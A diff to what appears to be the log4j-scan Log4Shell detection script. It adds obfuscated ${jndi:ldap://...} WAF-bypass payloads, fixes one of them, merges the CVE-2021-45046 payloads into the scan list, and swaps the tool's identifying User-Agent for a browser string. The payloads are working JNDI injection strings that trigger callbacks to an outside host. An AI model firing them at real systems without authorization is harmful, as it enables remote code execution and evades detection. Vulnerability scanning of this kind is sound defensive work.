@@ -42,8 +42,8 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
-    # 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
+    # 'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 
@@ -57,7 +57,7 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}/{{random}}}",
                        "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}}",
@@ -72,7 +72,9 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                        "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                        "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
-                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
+                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}",
+                       "${jndi:${lower:l}${lower:d}ap://{{callback_host}}}",
+                       "${jndi:${lower:l}${lower:d}ap://{{callback_host}}/{{random}}}"
                        ]
 
 cve_2021_45046 = [
@@ -311,9 +313,8 @@ def scan_url(url, callback_host):
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
 
     if args.cve_2021_45046:
-        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
-        payloads = get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
-
+        cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "red")
+        payloads.extend(get_cve_2021_45046_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
 
